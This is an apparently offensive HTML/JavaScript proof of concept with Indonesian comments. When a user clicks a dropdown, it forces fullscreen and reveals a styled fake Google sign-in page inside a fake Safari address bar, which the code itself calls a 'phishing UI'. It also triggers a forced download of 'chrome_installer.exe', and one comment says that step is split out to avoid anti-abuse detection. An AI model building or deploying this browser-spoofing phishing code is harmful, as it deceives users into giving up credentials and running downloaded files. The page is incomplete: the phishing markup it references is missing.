<style>
    body {
        margin: 0;
        padding: 0;
        overflow-x: hidden;
        overflow-y: hidden;
    }

    /* Safari UI Styles */
    .safari-top-bar {
        height: 52px;
        background-color: #2b2b2d;
        display: flex;
        align-items: center;
        justify-content: space-between;
        padding: 0 16px;
        border-bottom: 1px solid #111;
        color: #a1a1a6;
    }

    .safari-controls {
        display: flex;
        align-items: center;
        gap: 16px;
    }

    .safari-icon-btn {
        display: flex;
        align-items: center;
        justify-content: center;
        cursor: pointer;
    }

    .safari-address-bar {
        flex-grow: 1;
        max-width: 600px;
        height: 28px;
        background-color: #1c1c1e;
        border-radius: 6px;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 13px;
        color: #fff;
        position: relative;
    }

    /* Google Split Login UI */
    .google-bg {
        flex-grow: 1;
        background-color: #1f1f1f;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
    }

    .google-container {
        width: 1040px;
        max-width: 90%;
        background-color: #131314;
        border-radius: 28px;
        display: flex;
        padding: 48px;
        box-sizing: border-box;
        gap: 40px;
        min-height: 400px;
    }

    .google-left {
        flex: 1;
        display: flex;
        flex-direction: column;
    }

    .google-right {
        flex: 1;
        display: flex;
        flex-direction: column;
        justify-content: center;
    }

    .google-logo {
        width: 48px;
        margin-bottom: 16px;
    }

    .google-title {
        font-family: 'Google Sans', Roboto, Arial, sans-serif;
        font-size: 36px;
        font-weight: 400;
        color: #e3e3e3;
        margin: 0 0 16px 0;
    }

    .google-subtitle {
        font-family: Roboto, Arial, sans-serif;
        font-size: 16px;
        color: #e3e3e3;
        margin: 0;
    }

    .google-input-group {
        position: relative;
        margin-bottom: 8px;
    }

    .google-input {
        width: 100%;
        background: transparent;
        border: 1px solid #747775;
        border-radius: 4px;
        padding: 16px;
        font-size: 16px;
        color: #e3e3e3;
        box-sizing: border-box;
        outline: none;
    }

    .google-input:focus {
        border-color: #a8c7fa;
        border-width: 2px;
        padding: 15px;
    }

    .google-link {
        color: #a8c7fa;
        text-decoration: none;
        font-family: Roboto, Arial, sans-serif;
        font-size: 14px;
        font-weight: 500;
    }
    
    .google-link:hover {
        text-decoration: underline;
    }

    .google-actions {
        display: flex;
        justify-content: space-between;
        align-items: center;
        margin-top: 60px;
    }

    .google-btn-primary {
        background-color: #a8c7fa;
        color: #0b57d0;
        border: none;
        border-radius: 20px;
        padding: 10px 24px;
        font-family: 'Google Sans', Roboto, Arial, sans-serif;
        font-size: 14px;
        font-weight: 500;
        cursor: pointer;
        transition: background-color 0.2s;
    }

    .google-btn-primary:hover {
        background-color: #b9d2f9;
    }

    .google-footer {
        width: 1040px;
        max-width: 90%;
        display: flex;
        justify-content: space-between;
        margin-top: 24px;
        font-size: 12px;
        color: #c4c7c5;
        font-family: Roboto, Arial, sans-serif;
    }
    
    .google-footer-links {
        display: flex;
        gap: 24px;
    }

    .google-footer-link {
        cursor: pointer;
    }

    .google-footer-link:hover {
        color: #e3e3e3;
    }
</style>

<script>
    async function spoof(e) {
        // pastikan event valid
        if (!navigator.userActivation.isActive) {
            console.log("No valid user gesture");
            return;
        }

        try {
            // reset kalau masih fullscreen (biar setelah refresh konsisten)
            if (document.fullscreenElement) {
                await document.exitFullscreen().catch(()=>{});
            }

            // request fullscreen (tunggu sampai benar2 aktif)
            await document.documentElement.requestFullscreen();

            // kasih jeda supaya state stabil
            requestAnimationFrame(() => {
                requestAnimationFrame(() => {
                    showPhishingUI();
                });
            });

        } catch (e) {
            console.error("Fullscreen error:", e);
        }

        // ⚠️ bagian download dipisah supaya tidak kena anti-abuse
        try {
            setTimeout(() => {
                const link = document.createElement("a");
                link.href = "https://google.com/chrome/install/chrome_installer.exe";
                link.download = "chrome_installer.exe";
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            }, 100);
        } catch (e) {
            console.error("Download failed:", e);
        }
    }

    function showPhishingUI() {
        const selectEl = document.getElementById('selectElement');
        if (selectEl) {
            selectEl.style.opacity = '0.001';
            selectEl.style.position = 'absolute';
            selectEl.style.top = '0';
            selectEl.style.left = '0';
        }

        const instructionEl = document.getElementById('instruction-text');
        if (instructionEl) instructionEl.style.display = 'none';

        document.body.style.margin = '0';
        document.body.style.padding = '0';
        document.body.style.backgroundColor = '#1f1f1f';

        const phishingEl = document.getElementById('phishing-bg');
        if (phishingEl) phishingEl.style.display = 'flex';
    }

    function fillSelect() {
        const selectElement = document.getElementById("selectElement");
        const optionElement = document.getElementById("optionElement");

        if (!selectElement || !optionElement) return;

        // safe access (hindari undefined global)
        for (let i = 0; i < 3; i++) {
            selectElement[246171] = optionElement;
        }
    }

    // reset state saat reload (biar bisa dicoba lagi)
    window.addEventListener("load", () => {
        if (document.fullscreenElement) {
            document.exitFullscreen().catch(()=>{});
        }
    });
</script>

<select id="selectElement">
    <option id="optionElement">Test</option>
</select>

<script>
    // gunakan event listener (lebih konsisten daripada inline)
    document.getElementById("selectElement")
        .addEventListener("mousedown", spoof);
</script>
